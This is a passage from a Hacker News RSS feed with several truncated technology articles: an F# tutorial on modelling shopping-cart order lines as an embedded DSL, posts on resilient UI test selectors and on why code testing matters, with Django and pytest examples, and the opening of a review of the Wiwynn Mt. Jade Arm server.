<p>The demo will model changes to an Order Line in an online shopping
chart. It's probably completely overkill for such use, but it's
difficult to create good examples – see an actual use-case in the Large
demo.</p>
<p>We can Add an OrderLine, we can Increment and Decrement the count, and
we can Remove an OrderLine. To make things a bit more interesting, I
also added a Reset and Add with another initial count than 1.</p>
<p>We'll use an integer as a unique id for the OrderLine, and a integer for
the actual count and initial value.</p>
<div data-language="fsharp"><pre><code><span>type</span> <span>Key</span> <span>=</span> int
<span>type</span> <span>Value</span> <span>=</span> int</code></pre></div>
<h2>Defining a custom language for our domain</h2>
<p>We encode the possible operations on an OrderLine using a Discriminated
Union (also called a Sum Type). These operations are the verbs in our
domain, and our Embedded Domain Specific Language (EDSL) for
manipulating OrderLine items.</p>
<p>Only Set is needed to support our described operations, but we create
some more constructs in our language. Putting more in the language will
make mapping events to operations simpler as the language is more
expressive, at the cost of a more complex language. It's difficult to
decide what goes in the language, and what should only be helper
functions. If you need to distinguish between different operations (e.g.
increment vs set) when interpreting the operations, having them as
separate operations might be a good idea.</p>
<div data-language="fsharp"><pre><code><span>type</span> <span>Operation</span> <span>=</span>
    <span>|</span> Set <span>of</span> <span>(</span>Key <span>*</span> Value<span>)</span>
    <span>|</span> Reset <span>of</span> <span>Key</span>
    <span>|</span> Remove <span>of</span> <span>Key</span>
    <span>|</span> Incr <span>of</span> <span>Key</span>
    <span>|</span> Decr <span>of</span> <span>Key</span></code></pre></div>
<h2>Application state as an immutable record</h2>
<p>The State is where we hold information about all OrderItems. The state
includes things necessary to execute our lanugage. In addition, we keep
things which is convenient for other usecases, but could in theory just
as well be held in other structures. The <code>Audit</code> field is a list of all
operations which has been executed, which makes it easy to do things
like maintaining an audit log, persisting changes, detecting stale data,
rollback transactions, and so on.</p>
<p>Our last field, <code>LastPersisted</code>, is state for the interpreter which
persists changes to disk. Depending on the interpreter and application,
this state might be better to keep separate.</p>
<p>Having a single structure makes it easy to have a clean architecture
without much boilerplate (just <code>State -&gt; State</code> functions), but it can
be difficult to find out what information is used where, and who changes
what. As with any decision, it's a tradeoff, but having a simple
architecture might be more beneficial than a clean separation of state –
remember, there is no mutation or side-effects in the functions which
operates on the state!</p>
<div data-language="fsharp"><pre><code><span>type</span> <span>State</span> <span>=</span> <span>{</span>
    Data <span>:</span> <span>Map</span><span>&lt;</span>Key<span>,</span> <span>(</span>Value <span>*</span> Value<span>)</span><span>&gt;</span> 
    Audit <span>:</span> <span>Operation</span> list
    LastPersisted <span>:</span> <span>Operation</span>
<span>}</span> <span>with</span>
    <span>static</span> <span>member</span> Empty <span>=</span> <span>{</span>
        Data <span>=</span> Map<span>.</span>empty
        Audit <span>=</span> <span>[</span><span>]</span>
        
        LastPersisted <span>=</span> Remove <span>-</span><span>1</span>
    <span>}</span></code></pre></div>
<h2>Helpers for "manipulating" state, i.e. State -&gt; State functions</h2>
<p>As you start creating mappings from <code>ApplicationEvent</code> to <code>Operation</code>,
you'll quickly see patterns repeating for state querying and
manipulation. I like to extract these to helper functions as I go. For
our demo, I've created three helper functions.</p>
<p>Notice that the design here is to "never fail", and rather just return
sensible defaults instead. This of course depends on the application,
but this demo is modelled after our production application, which should
never fail to process an event.</p>
<div data-language="fsharp"><pre><code><span><span>[&lt;</span><span>Literal</span><span>&gt;]</span></span>
<span>let</span> defaultInitial <span>=</span> <span>1</span>


<span>let</span> getValue <span>(</span>key <span>:</span> <span>Key</span><span>)</span> <span>(</span>state <span>:</span> <span>State</span><span>)</span> <span>:</span> <span>(</span>Value <span>*</span> Value<span>)</span> <span>=</span>
    state<span>.</span>Data
    <span>|&gt;</span> Map<span>.</span>tryFind key
    <span>|&gt;</span> Option<span>.</span>defaultValue <span>(</span>defaultInitial<span>,</span> defaultInitial<span>)</span>


<span>let</span> setInitialAndValue <span>(</span>key <span>:</span> <span>Key</span><span>)</span> <span>(</span>initial <span>:</span> <span>Value</span><span>)</span> <span>(</span>value <span>:</span> <span>Value</span><span>)</span> <span>(</span>state <span>:</span> <span>State</span><span>)</span> <span>:</span> State <span>=</span>
    <span>{</span> state <span>with</span> Data <span>=</span> Map<span>.</span>add key <span>(</span>initial<span>,</span> value<span>)</span> state<span>.</span>Data <span>}</span>


<span>let</span> setValue <span>(</span>key <span>:</span> <span>Key</span><span>)</span> <span>(</span>value <span>:</span> <span>Value</span><span>)</span> <span>(</span>state <span>:</span> <span>State</span><span>)</span> <span>:</span> State <span>=</span>
    <span>let</span> initial<span>,</span> _ <span>=</span> getValue key state
    setInitialAndValue key initial value state</code></pre></div>
<h2>Interpreting our language and executing on State</h2>
<p>With the helper functions, we're now able to process our language. We'll
look at each operation, and manipulate the state accordingly. As a final
step, we log the operation we've executed. Even though we "execute" the
language, we're not mutating any existing state or doing any
side-effects. We're creating a new state as we go. It's thus important
that we use immutable/persistent datastructures that's fast for such
use, and that we're using them correctly e.g. by prepending to the list
rather than appending.</p>
<p>You might notice a <code>print</code> inside here, and scream SIDE-EFFECT! And yes,
it's true, but it's for demo purposes, and you shouldn't do this :)</p>
<div data-language="fsharp"><pre><code><span>let</span> execute <span>(</span>op <span>:</span> <span>Operation</span><span>)</span> <span>(</span>state <span>:</span> <span>State</span><span>)</span> <span>:</span> State <span>=</span>
    <span>match</span> op <span>with</span>
    <span>|</span> Set <span>(</span>key<span>,</span> value<span>)</span> <span>-&gt;</span>
        setValue key value state
    <span>|</span> Reset key <span>-&gt;</span>
        <span>let</span> initial<span>,</span> value <span>=</span> getValue key state
        setInitialAndValue key initial value state
    <span>|</span> Remove key <span>-&gt;</span>
        <span>{</span> state <span>with</span> Data <span>=</span> Map<span>.</span>remove key state<span>.</span>Data <span>}</span>
    <span>|</span> Incr key <span>-&gt;</span>
        <span>let</span> _<span>,</span> value <span>=</span> getValue key state
        setValue key <span>(</span>value <span>+</span> <span>1</span><span>)</span> state
    <span>|</span> Decr key <span>-&gt;</span>
        <span>let</span> _<span>,</span> value <span>=</span> getValue key state
        setValue key <span>(</span>value <span>-</span> <span>1</span><span>)</span> state
    <span>|&gt;</span> <span>fun</span> state <span>-&gt;</span>
        printfn <span>"Executed %A"</span> <span>op</span>
        <span>{</span> state <span>with</span> Audit <span>=</span> op <span>::</span> state<span>.</span>Audit <span>}</span></code></pre></div>
<h2>Interpreting our language and auditlog to persist to database</h2>
<p>Now that we have a way of changing the state, we can write an
interpreter that runs side-effects. This simulates writing to a
database. Remember that this interpreter has its state in <code>State</code>, so it
has to return a copy of it. In Haskell, this would be a
<code>State -&gt; IO State</code> function as it has side-effects, but in F#, we just
do side-effects without help from the type-system. The interpreters can
be made more efficient by avoiding unnecessary work. [Add 1, Remove 1]
can be reduced to a noop.</p>
<div data-language="fsharp"><pre><code><span>let</span> persist <span>(</span>state <span>:</span> <span>State</span><span>)</span> <span>:</span> State <span>=</span>
    state<span>.</span>Audit
    <span>|&gt;</span> Seq<span>.</span>takeWhile <span>(</span><span>fun</span> op <span>-&gt;</span> <span>not</span> <span>(</span>obj<span>.</span><span>ReferenceEquals</span><span>(</span>op<span>,</span> state<span>.</span>LastPersisted<span>)</span><span>)</span><span>)</span>
    <span>|&gt;</span> Seq<span>.</span>rev
    <span>|&gt;</span> Seq<span>.</span>fold <span>(</span><span>fun</span> state op <span>-&gt;</span>
        printfn <span>"Saving %A"</span> <span>op</span>
        <span>{</span> state <span>with</span> LastPersisted <span>=</span> op <span>}</span>
    <span>)</span> state</code></pre></div>
<h2>Mapping application events to our custom language</h2>
<p>We still haven't hooked our implementation up to the outer application,
but let's do this now. The key part is our <code>Handler</code> function which does
the mapping. It can access the state in case it needs to look at
anything, and it returns an <code>Operation option</code> in case the
<code>ApplicationEvent</code> should trigger a change in the state. An alternative
implementation could return <code>Operation list</code> instead to support 0+
rather than just 0-1. For events which should trigger more than one
change, we can just write multiple handlers, which is what we did in our
production application. In retrospect, a list would have been more
expressive, and might have made some mappings more readable.</p>
<div data-language="fsharp"><pre><code><span>type</span> <span>ApplicationEvent</span><span>(</span>key<span>)</span> <span>=</span>
    <span>member</span> <span>val</span> Key <span>=</span> key <span>with</span> get<span>,</span> set

<span>type</span> <span>Handler</span> <span>=</span> State <span>-&gt;</span> ApplicationEvent <span>-&gt;</span> Operation option</code></pre></div>
<p>Given an event has happened in the application, we need a way to run
this through all possible handlers, accumulating the changes. This
implementation runs in sequence, where each handler will see the changes
done by the previous. Depending on the use-case, you might want to run
them in parallel, merging the result, or similar.</p>
<div data-language="fsharp"><pre><code><span>let</span> handle <span>(</span>handlers <span>:</span> <span>Handler</span> list<span>)</span> <span>(</span>ev …</code></pre></div></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://functional.christmas/2020/22">https://functional.christmas/2020/22</a></em></p>]]>
            </description>
            <link>https://functional.christmas/2020/22</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504355</guid>
            <pubDate>Tue, 22 Dec 2020 08:59:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to make your UI automation tests resilient to changes?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25504262">thread link</a>) | @Kodziak
<br/>
December 22, 2020 | https://kodziak.com/blog/how-to-make-your-ui-automation-tests-resilient-to-changes | <a href="https://web.archive.org/web/*/https://kodziak.com/blog/how-to-make-your-ui-automation-tests-resilient-to-changes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Using CSS selectors to get elements in end-to-end tests is the most common way (besides xpath), but it can also be tricky and hard to maintain. One day everything could work fine and another a CSS class could be renamed. Styles could change without touching the business flow and then we could have a problem - we'll need to maintain the tests. Of course, the developers could do those changes for us, but they don't know our scenarios, our tests etc. It would be time-consuming for them, because they don't always know if their changes could affect our tests. And for these problems, I think I might have a solution.</p>
<p>But first let's talk about CSS a bit.</p>
<h2 id="what-are-the-common-problems-with-css-selectors">What are the common problems with CSS selectors?</h2>
<p>Imagine that one day, you had to write a very ugly selector. The element you wanted to use was nested and the only solution available was to base it on CSS classes and HTML structure. And then, a developer made a little refactor that removed some useless HTML tags, which were of course, used in your selector. But he didn't change the business flow. And guess what will happen? Yes, you're right! The test will fail. Your selector will be broken and will need maintenance.</p>
<p>But let's take a step back and think about what are CSS classes designed for? For sure, not to use them in end-to-end tests. Why? Because they're designed to style elements. Everyday there might be changes in the application that don't affect the business flow - which is the most important part in end-to-end tests - but are related with class names changes. That hurts when we need to maintain a test that didn't involve any user flow changes.</p>
<p>Two examples, one simple solution - find better a mechanism to get elements.</p>
<p>What do I recommend? Read below!</p>
<h2 id="use-data-test-id-for-help">Use <code>data-test-id</code> for help!</h2>
<p>For sure, they're controversial but there are two main advantages of using them.</p>
<p>First one is that they're bulletproof. What? I mean, when we use this attribute with an element, no matter if the developer changes the HTML structure or CSS classes, we still get what we want. Unless they remove the element or change the business flow, our test should work fine.</p>
<p>And second, as you may notice, the developer will see that attribute while working with the code. It could help because they can notify us about possible changes or just maintain the tests if needed - using <code>data-test-id</code> makes it easier find occurrences in tests. And if we have more people working on end-to-end tests we can build more reliable solutions. That's what we all want to achieve - always working product:)</p>
<p>More about working closely with developers below:)</p>
<h2 id="but-should-i-use-them-everywhere">But should I use them everywhere?</h2>
<p>Nope. Only with the elements used in tests. We don't want a mess in the code where almost every element has this attribute and only a few of them is used in tests. We want to build trust towards the tests and somehow show the devs that their changes could break our work.</p>
<p>Of course, we'll add some code, but with <code>babel</code> or similar solution we'll get rid of <code>data-test-id</code> on production version. Also, you can take a look at <code>facebook</code> where these attributes are used;).</p>
<p>A little bit of extra work can bring us many benefits.</p>
<h2 id="what-are-the-benefits-of-using-them">What are the benefits of using them?</h2>
<p>For sure, we can build communication between us and developers. How? Talk. If they see this kind of attribute with an element they want to refactor, they have to maintain the test (in the best case) or just notify us that something could affect it. It's beneficial to know when something can break our tests before running them on testing environment. It'll build trust to the tests. They won't fail because of changes which don't affect the business flow. It will help all of us.</p>
<p>The only thing we need to do is give the developers an opportunity and reason to maintain the tests.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Code structure can always change and it shouldn't affect our tests unless the business flow changes. With selectors based on CSS it could. That's why we decided to go with <code>data-test-id</code> which seems like a reliable solution.</p>
<p>They have some shortcomings but overall I think there is more pros. If you use them you'll work closely with devs which could result in other interesting solutions:) Just remember to add them wisely - only in the elements you're using in tests:)</p>
<p>Have a nice day! 🥳</p></div></div>]]>
            </description>
            <link>https://kodziak.com/blog/how-to-make-your-ui-automation-tests-resilient-to-changes</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504262</guid>
            <pubDate>Tue, 22 Dec 2020 08:41:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Testing your code is not optional]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25504016">thread link</a>) | @alfotis
<br/>
December 21, 2020 | https://www.falexandrou.com/2020/12/20/testing-your-code/ | <a href="https://web.archive.org/web/*/https://www.falexandrou.com/2020/12/20/testing-your-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<h3 id="lets-start-with-a-story">Let’s start with a story…</h3>
<p>A quadrillion years ago, I used to work for companies none of which had automated tests in place and believe it or not,
testing was not that popular; We wrote the code, tested manually on our local machines, deployed our newly committed
piece of art and called it a day. If however, something went wrong, we tried to replicate the issue on a test environment,
fixed it, deployed the fix and so on, usually hoping that the fix wouldn’t introduce a <a href="https://en.wikipedia.org/wiki/Software_regression">regression</a>.</p>
<p>Then, writing unit tests somehow gained traction and became popular among developers who liked following best practices but still,
there was a lot of ground to be covered in fast-moving startups and agencies, where delivering projects is a time-sensitive thing.
I even remember debating the lead developer of a VC-backed startup, who at some point insisted that testing is a waste of time and that’s why they didn’t do it.</p>
<h4 id="so-is-testing-our-code-a-waste-of-time">So, is testing our code a waste of time?</h4>
<p><strong>No, it’s not!</strong> Believe it or not though, this was (hopefully isn’t anymore) a somehow acceptable opinion a few years back.
While testing may require some development time, it actually helps save enormous amounts of time if done properly.</p>
<p>Let’s think of the following scenario:</p>
<ul>
<li>A developer works on Feature X for a few days, completes their work and pushes code to the testing environment.</li>
<li>Then, a QA or the developer themselves tests manually, finds a couple of issues which are then fixed and the project hits production.</li>
<li>The code then interacts with user-input or other existing data in a database and errors occur.</li>
<li>The Product Owner raises a ticket, assigns the QA, the QA reproduces the issue, adds technical information to the ticket, sends it to the developer,
they apply a fix and the ticket goes back n forth between the stakeholders until the code hits production.</li>
</ul>
<p>In the meantime, there might be regression issues and the back n forth continues until at some point the ticket closes, while several others have been raised.</p>
<p>Chaos? Yes. Reminds you of something? It certainly does for me. This was the daily, fire-fighting routine for the lead developer that was mentioned earlier.</p>
<p>Having an efficient and detailed testing suite in place, saves you some of this trouble; The code and tests are written, the QA does what they’re supposed to do,
(make sure the finished product meets certain quality standards), instead of getting blocked becaused they stumbled upon a tiny mistake that could have been caught beforehand.
Ideal? Maybe. Let’s now break down the several ways we can save time.</p>
<h4 id="testing-is-a-safety-net-but-also-a-documentation-and-developer-onboarding-tool">Testing is a safety net, but also a documentation and developer onboarding tool</h4>
<p>Usually, the scope of a function is (or should be) limited and, depending on the input, there are certain outcomes.
Covering a few default cases, should be a nice way to test said function and save ourselves (and the QA) some time being stopped by runtime errors that would easily be prevented.</p>
<p>If however not all cases were covered and some bug gets reported, it’s fine (in fact great!) because this means we’re enhancing the testing suite with another case,
making our code even more resilient.</p>
<p>Along with this benefit, there lies another: Tests are a great (yet, not the only) documentation and onboarding tool, which
means that they should be clear, descriptive and be able to provide a high level overview of what the code should accomplish.</p>
<p>For example, here is an excerpt from a few tests I wrote for a Django view that launches deployment operations:</p>
<div><div><pre><code><span>def</span> <span>it_creates_and_runs_an_operation_given_a_commit_reference</span><span>(</span><span>mock_user</span><span>,</span> <span>create_operation_data</span><span>):</span>
    <span># ...
</span>    <span>assert</span> <span>response</span><span>.</span><span>status_code</span> <span>==</span> <span>201</span>
    <span>assert</span> <span>response</span><span>.</span><span>data</span><span>[</span><span>'id'</span><span>]</span>
    <span>assert</span> <span>response</span><span>.</span><span>data</span><span>[</span><span>'kind'</span><span>]</span> <span>==</span> <span>'deployment'</span>
    <span># ...
</span>    <span>assert</span> <span>operation</span><span>.</span><span>is_running</span>

<span>def</span> <span>it_creates_and_runs_an_operation_without_a_commit_reference</span><span>(...):</span>
    <span># ....
</span>    <span>assert</span> <span>operation</span><span>.</span><span>is_running</span>
    <span>assert</span> <span>mock_celery_task</span><span>.</span><span>call_count</span> <span>==</span> <span>1</span>
    <span>assert</span> <span>operation</span><span>.</span><span>reference</span> <span>==</span> <span>expected_commit_information</span><span>[</span><span>'reference'</span><span>]</span>

<span>def</span> <span>it_does_not_start_the_operation_when_another_is_queued_prior_to_it</span><span>(...):</span>
    <span># Create an operation that is queued prior to the one we're queueing
</span>    <span>prior</span> <span>=</span> <span>operation_factory</span><span>.</span><span>create</span><span>(...)</span>
    <span># ...
</span>    <span>assert</span> <span>response</span><span>.</span><span>status_code</span> <span>==</span> <span>201</span>
    <span># ...
</span>    <span>assert</span> <span>not</span> <span>operation</span><span>.</span><span>can_start</span><span>()</span>
    <span>assert</span> <span>not</span> <span>operation</span><span>.</span><span>is_running</span>
    <span>assert</span> <span>not</span> <span>mock_celery_task</span><span>.</span><span>call_count</span>
    <span>assert</span> <span>operation</span><span>.</span><span>is_queued</span>
</code></pre></div></div>
<p>We now have of tests, groupped together with descriptive names, that provide an outline
that an operation can be started with or without a given reference, and what the expected statuses for the model in the database
and the returned HTTP status code should be. When I revisit this example in the future, or whenever a new hire joins the project,
it will hopefully be obvious to them, what the expected behavior should be without having to read long documentation.
Also, it covers three of the most common cases in the system, related to the “operations” feature.</p>
<h4 id="keeping-tests-fast--testing-the-right-things">Keeping tests fast &amp; testing the right things</h4>
<p>Assuming you are using a web framework like Django or Ruby on Rails and you need to test an ORM or an ActiveRecord model,
it doesn’t make any sense to test the <code>.save</code> or <code>.get</code> methods, because they’re already tested for you by
the amazing people that build the framework of choice. However, testing a custom validator you have
added to your model is a requirement.</p>
<p>The scope of a test should be limited as well. Let’s take the following real-world example where we use pytest (with some syntactic sugar)
to test a <a href="https://docs.celeryproject.org/en/stable/userguide/index.html">celery task</a> that starts a queued deployment operation.
The <code>create_container</code> function runs a Docker container, but testing this is a) out of the given scope and b) slow if we create the actual container.
The solution to this issue would be to <a href="https://en.wikipedia.org/wiki/Mock_object">mock</a> the <code>create_container</code> call within the current scope:</p>
<div><div><pre><code><span>@</span><span>pytest</span><span>.</span><span>mark</span><span>.</span><span>django_db</span>
<span>def</span> <span>describe_start_operation_task</span><span>():</span>
    <span>def</span> <span>it_runs_the_task</span><span>(</span><span>queued_deployment</span><span>,</span> <span>mock_container</span><span>):</span>
        <span>allow</span><span>(</span><span>tasks</span><span>).</span><span>create_container</span><span>.</span><span>and_return</span><span>(</span><span>mock_container</span><span>)</span>
        <span>assert</span> <span>not</span> <span>queued_deployment</span><span>.</span><span>task_id</span>
        <span>assert</span> <span>not</span> <span>queued_deployment</span><span>.</span><span>container_id</span>

        <span># run the task
</span>        <span>celery_task</span> <span>=</span> <span>tasks</span><span>.</span><span>start_operation</span><span>.</span><span>s</span><span>(</span><span>operation_id</span><span>=</span><span>queued_deployment</span><span>.</span><span>id</span><span>).</span><span>apply_async</span><span>()</span>

        <span># make sure the deployment fields were populated accordingly
</span>        <span>queued_deployment</span><span>.</span><span>refresh_from_db</span><span>()</span>
        <span>assert</span> <span>queued_deployment</span><span>.</span><span>task_id</span> <span>==</span> <span>celery_task</span><span>.</span><span>id</span>
        <span>assert</span> <span>queued_deployment</span><span>.</span><span>container_id</span> <span>==</span> <span>mock_container</span><span>.</span><span>id</span>
</code></pre></div></div>
<p><a href="https://twitter.com/sandimetz">Sandi Metz</a> and <a href="https://twitter.com/kytrinyx">Katrina Owen</a> in their
great book <a href="https://sandimetz.com/99bottles">99 Bottles of OOP</a>, clearly and constantly state that
the tests should run upon every line of code that gets changed and they’re right. In practice, this
means that you should be able to run all your test suite as fast as possible.</p>
<p>In our example, we managed to save quite some time by mocking the docker container creation, which
is handled internally by a well tested library. Other examples might include external network requests,
big files loaded, email sending etc.</p>
<p>You might also have noticed in my examples that there is a certain degree of duplication. This is fine.
The tests are not a place to practice <a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself">DRY</a>; they
should be explicit and detailed in order for the other person to be able to understand every tiny bit of the process,
but also, doing fancy things usually leads to errors and you do want your tests to be straight-forward and valid.</p>
<h4 id="meet-your-new-best-friends">Meet your new best friends</h4>
<p>In the examples provided above, I introduced a few concepts that you might not be familiar with so far,
but will become your new best friends when you dive deep into testing: Factories, Fakes, Fakes, Stubs and Mocks.
Here’s some basic guidelines that would help you decide what you need each time:</p>
<ul>
<li>If you want an object and with random data, register a factory.</li>
<li>If you need an object with specific, predictable data, go for a fixture.</li>
<li>If you need a simplified version of a method or a class, with limited functionality, fake it.</li>
<li>If you need a set of predefined data returned by a method, stub it.</li>
<li>If you just need to count the calls to a method, mock it.</li>
</ul>
<h4 id="how-having-a-proper-test-suite-improves-your-code">How having a proper test suite improves your code</h4>
<p>Writing code with testability in mind, eventually leads to cleaner code, simply because in order to keep the tests simple,
one has to write short-scoped code that is limited to specific things. Long methods that do several things
are as hard to test as to maintain so, having testability in mind, meaning that you <strong>have</strong> to test such pieces of code,
practically acts as an incentive to keep the code maintainable.</p>
<p>Finally, refactoring and cleanup tasks, are a lot safer when the code is covered by reliable tests that will
stop your deployment when something breaks, which makes such tasks a breeze for the developer.</p>
<h4 id="theres-no-strategy-thats-better-than-others">There’s no strategy that’s better than others</h4>
<p>I am aware that picking a testing strategy and policy could be a difficult task, however I don’t think that a team should stress about it, also it should be a choice
that’s adapted to the team’s modus operandi, so that they adapt easily to it and it doesn’t seem like a huge shift from what they had been doing so far.</p>
<p>If the team wants to practice <a href="https://en.wikipedia.org/wiki/Behavior-driven_development">BDD</a> and that’s something that suits the project,
it should be OK. If the team doesn’t feel OK about doing <a href="https://en.wikipedia.org/wiki/Test-driven_development">TDD</a> where they should write tests in advance,
that should be fine as well, because the purpose is to save the team’s time, not force strict policies.
I am aware that methodologies exist for a reason, but experience shows that as long as the team are not practicing
<a href="https://www.hanselman.com/blog/fear-driven-development-fdd">FDD</a>, it should be OK.</p>
<h4 id="conclusion">Conclusion</h4>
<p>No matter how experienced or good we are at what we do, we will make that mistake. In order to avoid that annoying RuntimeError that
will disrupt our user’s delightful experience, we have to make sure that our code works well no matter what and luckily, we have the tools to do so.
Embrace testing, focus on covering as many scenarios as you can and feel comfortable deploying. Even on Friday…</p>
<h4 id="further-reading">Further reading</h4>
<ul>
<li><a href="https://web.stanford.edu/class/archive/cs/cs107/cs107.1212/testing.html">Software Testing Strategies</a> - Written by Julie Zelenski, with modifications by Nick Troccoli</li>
<li><a href="https://martinfowler.com/bliki/TestDouble.html">TestD…</a></li></ul></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.falexandrou.com/2020/12/20/testing-your-code/">https://www.falexandrou.com/2020/12/20/testing-your-code/</a></em></p>]]>
            </description>
            <link>https://www.falexandrou.com/2020/12/20/testing-your-code/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504016</guid>
            <pubDate>Tue, 22 Dec 2020 07:55:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ampere Altra Wiwynn Mt. Jade Server Review the Most Significant Arm Server]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25503939">thread link</a>) | @rbanffy
<br/>
December 21, 2020 | https://www.servethehome.com/ampere-altra-wiwynn-mt-jade-server-review-the-most-significant-arm-server/ | <a href="https://web.archive.org/web/*/https://www.servethehome.com/ampere-altra-wiwynn-mt-jade-server-review-the-most-significant-arm-server/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-CPUs-and-Memory-Angled.jpg" data-caption="Wiwynn Mt Jade Ampere Altra CPUs And Memory Angled"><img width="696" height="465" src="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-CPUs-and-Memory-Angled-696x465.jpg" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-CPUs-and-Memory-Angled-696x465.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-CPUs-and-Memory-Angled-400x267.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-CPUs-and-Memory-Angled-629x420.jpg 629w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-CPUs-and-Memory-Angled.jpg 800w" sizes="(max-width: 696px) 100vw, 696px" alt="Wiwynn Mt Jade Ampere Altra CPUs And Memory Angled" title="Wiwynn Mt Jade Ampere Altra CPUs And Memory Angled"></a><figcaption>Wiwynn Mt Jade Ampere Altra CPUs And Memory Angled</figcaption></figure></div>
            <!-- content --><p>In our Ampere Altra powered Wiwynn Mt. Jade server review, we are going to see why we feel this is the most significant new server of 2020.&nbsp;Wiwynn is far from a household name but it should not be unfamiliar to STH readers. STH got an exclusive tour in Q4 2018 of the company’s headquarters. You can read about that in <a href="https://www.servethehome.com/where-cloud-servers-come-from-visiting-wiwynn-in-taipei/">Where Cloud Servers Come From Visiting Wiwynn in Taipei</a>. Although Wiwynn may not be called out in press releases such as the&nbsp;<a href="https://www.servethehome.com/idc-3q20-server-tracker-dell-and-hpe-with-big-share-gain-lenovo-inspur-huawei/">IDC 3Q20 Server Tracker</a> it counts large cloud providers such as Facebook and Microsoft among its customers and has revenue of almost $6B USD per year the last time we checked. Compared to the traditional vendors IDC puts in their press releases, that would put them above Lenovo on hardware sales revenue, but with far fewer employees. Having the Wiwynn Mt. Jade server platform with the Arm-based Ampere Altra is a big deal. Wiwynn’s business model is not to sell low numbers of servers to customers.<span id="more-49470"></span></p>
<p>In this review, we are going to look at the platform, and discuss some of the great features and nuances. We are also going to discuss performance, and then we are going to discuss why this is one of the most important platforms to be released in 2020. Even if you are not interested in Arm servers, this review is going to have some insights that go well beyond just the Altra processor and the server itself.</p>
<h2>Video Version</h2>
<p>As with many of our new pieces, we are going to have a video version of this article as well.</p>
<p><iframe title="Most Significant Server of 2020 Wiwynn Mt Jade Ampere Altra Arm Server" width="696" height="392" src="https://www.youtube.com/embed/jESiMLQVNf4?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>This is a longer video, and has a lot of commentary around the server, and the market impact. As always, we suggest opening a new browser/ tab to watch it as it is a better experience than the embedded player. Also, likes and channel subscriptions are always welcome.</p>
<h2>Ampere Altra Wiwynn Mt. Jade Server Hardware Overview</h2>
<p>With our server reviews going into more detail, we now split our hardware overview into two primary sections. The first is that we look at the exterior of the server to get the basic bits that one servicing the server in a rack would most likely notice. We then get into the internal overview to look at some of the configurability and key features of the server.</p>
<h3>Ampere Altra Wiwynn Mt. Jade Server External Hardware Overview</h3>
<p>Taking a look at the Mt. Jade platform, we can see a fairly typical 2U server layout. This has a single USB port on the left, and a VGA port along with standard power button/ LEDs on the right. The main feature, by far, is storage. There are 24x 2.5″ bays and Wiwynn is leveraging the Ampere Altra platform to deliver one of the most forward-looking designs we have seen to date.</p>
<figure id="attachment_49484" aria-describedby="caption-attachment-49484"><a href="https://www.servethehome.com/ampere-altra-wiwynn-mt-jade-server-review-the-most-significant-arm-server/wiwynn-mt-jade-ampere-altra-front-bays/" rel="attachment wp-att-49484"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Front-Bays.jpg" alt="Wiwynn Mt Jade Ampere Altra Front Bays" width="800" height="462" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Front-Bays.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Front-Bays-400x231.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Front-Bays-696x402.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Front-Bays-727x420.jpg 727w" sizes="(max-width: 800px) 100vw, 800px"></a><figcaption id="caption-attachment-49484">Wiwynn Mt Jade Ampere Altra Front Bays</figcaption></figure>
<p>Wiwynn is connecting these 24x drive bays using 6x Amphenol PCIe Gen4 x16 cables. This is not a server designed for SAS/ SATA, instead, the company is leveraging the unique capabilities of the Ampere Altra platform to deliver something decidedly ahead of what many traditional vendors such as Dell, HPE, and Lenovo offer. Here the backplane does not have features such as a SAS expander. Instead, this is a NVMe backplane. One can see the backplanes are held in by thumbscrews, but the impact of Ampere Altra is felt immediately here, this is an all-NVMe design. This design provides Wiwynn the flexibility to swap to a SAS/SATA backplane setup if a customer wishes, but we really like this hardline stance to simplify on a next-generation architecture.</p>
